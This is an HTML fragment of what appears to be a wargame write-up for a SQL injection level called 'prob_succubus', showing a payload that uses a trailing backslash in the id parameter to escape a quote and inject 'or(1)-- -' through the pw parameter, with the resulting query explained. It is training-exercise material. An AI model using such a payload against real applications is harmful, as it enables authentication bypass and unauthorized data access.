+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">    Payload : id<span style="color:#f92672">=</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#f92672">&amp;</span>pw<span style="color:#f92672">=</span><span style="color:#66d9ef">or</span>(<span style="color:#ae81ff">1</span>)<span style="color:#75715e">-- -
+</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">Explain</span>:
+        <span style="color:#66d9ef">select</span> id <span style="color:#66d9ef">from</span> prob_succubus <span style="color:#66d9ef">where</span> id<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;\&#39;</span> <span style="color:#66d9ef">and</span> pw<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;or(1)-- -&#39;</span>
+        <span style="color:#75715e">-- id=&#39;\&#39; and pw=&#39;,thus $_GET[pw] will be escaped
+</span></code></pre></div>
 
         
     </article>
